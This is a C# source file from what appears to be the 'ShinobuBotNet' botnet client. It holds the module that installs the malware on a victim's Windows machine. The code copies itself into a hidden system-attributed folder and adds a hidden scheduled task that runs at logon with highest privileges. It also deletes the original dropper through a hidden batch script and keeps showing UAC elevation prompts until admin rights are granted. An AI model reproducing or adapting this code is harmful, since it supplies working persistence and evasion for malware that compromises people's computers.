using System;
using System.IO;
using System.Threading;
using System.Management;
using System.Reflection;
using System.Diagnostics;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace ShinobuBotNet
{
    class install
    {
        // Copy self to system
        public static void installSelf()
        {
            Console.WriteLine("[+] Copying to system...");
            if (!Directory.Exists(config.dir))
            {
                // Create dir
                Directory.CreateDirectory(config.dir);
            }
            if (!System.IO.File.Exists(config.InstallPath))
            {
                // Copy
                System.IO.File.Copy(Application.ExecutablePath, config.InstallPath);
                DirectoryInfo dir = new DirectoryInfo(Path.GetDirectoryName(config.InstallPath));
                // Set hidden attribute
                if (config.AttributeHiddenEnabled)
                {
                    dir.Attributes |= FileAttributes.Hidden;
                }
                // Set system attribute
                if (config.AttributeSystemEnabled)
                {
                    dir.Attributes |= FileAttributes.System;
                }

            }
        }

        public static void setAutorun()
        {
            Console.WriteLine("[+] Installing to autorun...");
            TaskSchedulerCommand($"/create /f /sc ONLOGON /RL HIGHEST /tn \"{config.AutorunName}\" /tr \"{config.InstallPath}\"");
        }
        //  TaskScheduler command
        private static void TaskSchedulerCommand(string args)
        {
            // If autorun disabled
            if (!config.AutorunEnabled)
            { return; }
            // Add to autorun
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "schtasks.exe";
            startInfo.Arguments = args;
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
        }

        // Remove self from system
        public static void uninstallSelf()
        {
            Console.WriteLine("[+] Uninstalling from system...");
            // Remove directory
            // Paths
            string batch = Path.GetTempFileName() + ".bat";
            string currentPid = Process.GetCurrentProcess().Id.ToString();
            // Write batch
            using (StreamWriter sw = File.AppendText(batch))
            {
                sw.WriteLine(":l");
                sw.WriteLine("Tasklist /fi \"PID eq " + currentPid + "\" | find \":\"");
                sw.WriteLine("if Errorlevel 1 (");
                sw.WriteLine(" Timeout /T 1 /Nobreak");
                sw.WriteLine(" Goto l");
                sw.WriteLine(")");
                sw.WriteLine("Rmdir /S /Q \"" + Path.GetDirectoryName(config.InstallPath) + "\"");
            }
        }
        // Uninstall from startup
        public static void delAutorun()
        {
            Console.WriteLine("[+] Uninstalling from autorun...");
            TaskSchedulerCommand($"/delete /f /tn \"{config.AutorunName}\"");
        }

        // Delete file after fisrt start
        public static void MeltFile()
        {
            // Check 1
            if (!config.MeltFileAfterStart)
            { return; }
            // Check 2
            if (Application.ExecutablePath == config.InstallPath)
            { return; }
            // Paths
            string batch = Path.GetTempFileName() + ".bat";
            string currentPid = Process.GetCurrentProcess().Id.ToString();
            // Write batch
            using (StreamWriter sw = File.AppendText(batch))
            {
                sw.WriteLine(":l");
                sw.WriteLine($"Tasklist /fi \"PID eq {currentPid}\" | find \":\"");
                sw.WriteLine("if Errorlevel 1 (");
                sw.WriteLine(" Timeout /T 1 /Nobreak");
                sw.WriteLine(" Goto l");
                sw.WriteLine(")");
                sw.WriteLine($"Del \"{(new FileInfo((new Uri(Assembly.GetExecutingAssembly().CodeBase)).LocalPath)).Name}\"");
                sw.WriteLine($"Cd \"{Path.GetDirectoryName(config.InstallPath)}\"");
                sw.WriteLine("Timeout /T 1 /Nobreak");
                sw.WriteLine($"Start \"\" \"{Path.GetFileName(config.InstallPath)}\"");
            }
            // Start
            Process.Start(new ProcessStartInfo()
            {
                Arguments = $"/C {batch} & Del {batch}",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            // Done
            Environment.Exit(1);
        }

        public static void Reboot()
        {
            Process.Start("shutdown", "/r /t 0");
        }

        // Elevate previleges
        public static void elevatePrevileges()
        {
            while (true)
            {
                // Elevate previleges
                if (!utils.IsAdministrator())
                {
                    Console.WriteLine("[~] Trying elevate previleges to administrator...");
                    Process proc = new Process();
                    proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    proc.StartInfo.FileName = Application.ExecutablePath;
                    proc.StartInfo.Arguments = "";
                    proc.StartInfo.UseShellExecute = true;
                    proc.StartInfo.Verb = "runas";
                    proc.StartInfo.CreateNoWindow = true;
                    try
                    {
                        proc.Start();
                        proc.WaitForExit();
                        Environment.Exit(1);
                    }
                    catch (System.ComponentModel.Win32Exception)
                    {
                        if (config.AdminRightsRequired)
                        { continue; }
                        else { break; }
                    }
                }
                else { break; }
            }
        }
    }
}
